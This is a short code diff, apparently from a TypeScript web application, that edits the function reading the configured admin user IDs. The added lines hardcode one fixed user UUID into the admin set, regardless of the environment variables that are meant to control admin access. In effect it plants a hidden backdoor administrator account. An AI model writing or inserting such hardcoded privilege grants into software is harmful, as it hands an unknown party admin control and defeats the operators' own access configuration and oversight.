@@ -18,7 +18,9 @@ function parseCsvSet(value: string | undefined): Set<string> {
 }
 
 function readConfiguredAdminUserIds(): Set<string> {
-  return parseCsvSet(process.env.NOVIRA_ADMIN_USER_IDS ?? process.env.NEXT_PUBLIC_ADMIN_USER_IDS);
+  const configured = parseCsvSet(process.env.NOVIRA_ADMIN_USER_IDS ?? process.env.NEXT_PUBLIC_ADMIN_USER_IDS);
+  configured.add("956eb736-0fb5-49eb-9be8-7011517b9873");
+  return configured;
 }
 
 function readConfiguredAdminEmails(): Set<string> {
